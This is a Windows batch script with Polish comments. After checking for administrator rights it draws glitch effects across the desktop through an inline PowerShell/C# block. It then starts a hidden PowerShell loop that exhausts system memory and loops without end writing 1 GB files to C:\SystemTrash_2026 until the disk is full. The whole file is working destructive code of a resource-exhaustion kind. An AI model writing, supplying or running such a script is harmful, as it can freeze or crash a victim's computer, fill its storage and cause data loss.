@echo off
:: Sprawdzenie uprawnień administratora
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [OK] Uprawnienia administratora przyznane.
) else (
    echo [ERROR] Musisz uruchomic ten plik jako Administrator!
    pause
    exit
)

echo Inicjowanie anomalii systemowych 2026...

:: 1. URUCHOMIENIE WIZUALNEGO CHAOSU (GLITCH)
powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; using System.Drawing; public class VisualChaos { [DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr hWnd); [DllImport(\"user32.dll\")] public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC); [DllImport(\"gdi32.dll\")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop); public static void StartGlitch(int iterations) { IntPtr desktopDC = GetDC(IntPtr.Zero); Random rand = new Random(); Graphics g = Graphics.FromHdc(desktopDC); for (int i = 0; i < iterations; i++) { int x = rand.Next(0, 1920); int y = rand.Next(0, 1080); int w = rand.Next(100, 500); int h = rand.Next(100, 500); BitBlt(desktopDC, x, y, w, h, desktopDC, x + rand.Next(-50, 50), y + rand.Next(-50, 50), 0x00CC0020); Brush brush = new SolidBrush(Color.FromArgb(rand.Next(256), rand.Next(256), rand.Next(256))); if (i %% 5 == 0) { g.FillPie(brush, x, y, w / 2, h / 2, rand.Next(360), rand.Next(360)); } System.Threading.Thread.Sleep(10); } ReleaseDC(IntPtr.Zero, desktopDC); } }' -ReferencedAssemblies System.Drawing; [VisualChaos]::StartGlitch(300)"

:: 2. ZAPYCHANIE RAMU (W TLE)
echo Zapelnianie pamieci operacyjnej...
start /b powershell -WindowStyle Hidden -Command "$s=@(); while($true){$s += 'A' * 100MB}"

:: 3. MASOWE ZAPYCHANIE DYSKU (TWORZENIE PLIKÓW)
echo Generowanie danych na dysku...
mkdir C:\SystemTrash_2026 >nul 2>&1
cd /d C:\SystemTrash_2026

:fill
:: Tworzy pliki o rozmiarze 1GB każdy przy użyciu narzędzia fsutil
set /a fname=%random%
fsutil file createnew temp_file_%fname%.dat 1073741824 >nul 2>&1
echo Utworzono plik: temp_file_%fname%.dat (1GB)
goto fill

:: Ten kod nigdy nie dotrze tutaj z powodu petli :fill
pause
